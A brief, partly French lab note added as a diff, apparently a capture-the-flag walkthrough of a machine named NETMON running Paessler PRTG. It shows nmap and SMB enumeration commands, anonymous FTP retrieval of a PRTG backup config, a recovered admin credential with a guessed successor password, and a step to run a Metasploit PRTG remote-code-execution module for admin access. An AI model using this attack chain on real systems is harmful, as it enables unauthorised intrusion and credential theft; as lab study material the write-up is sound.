@@ -1,0 +1,14 @@
+$nmap -sV IP
+21/tcp  open  ftp          Microsoft ftpd
+80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+OSs: Windows, Windows Server 2008 R2 - 2012
+
+$crackmapexec smb IP == SMB 10.10.10.152 445 NETMON [*] Windows Server 2016 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
+$enum4linux IP
+ftp ANONYMOUS, go to \ProgramData\Paessler\PRTG Monitor\ Confilg.old.bak 
+recup <dbpass>prtgadmin:PrTg@dmin2018<\dbpass>
+Maintenant le password est : PrTg@dmin2019
+Lancer Metasploit, search prtg, executer la rce, passer admin
